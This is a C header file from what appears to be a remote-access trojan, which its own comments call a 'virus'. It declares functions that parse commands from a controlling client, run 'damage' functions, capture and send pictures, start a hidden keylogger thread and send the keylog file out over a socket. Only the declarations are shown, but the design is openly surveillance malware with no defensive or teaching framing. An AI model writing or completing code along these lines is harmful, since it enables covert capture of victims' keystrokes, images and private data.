#pragma once
#include "utilities.h"
#include "Socket.h"
#include "KeyLogger.h"


// This function is called if there are commands for the virus to do -> the 'brain' / 'manager', using the damage functions.
int start_damage(char* data);

// This function fills up the commands array with the command given in the data.
int split_data_to_commands(char** commands, int commands_size, char* data);

// This function does the commands that the client asked for and sends them.
int do_commands_and_send(char** commands, int amount_of_commands);

// This function sends the picture taken through the socket connection.
int send_picture();

// This function starts the key logger function in a new thread.
int start_key_logger_threaded();

// This function closes the key logger thread.
int close_key_logger_thread();

// This function sends the Key Logger file.
int send_key_logger_file();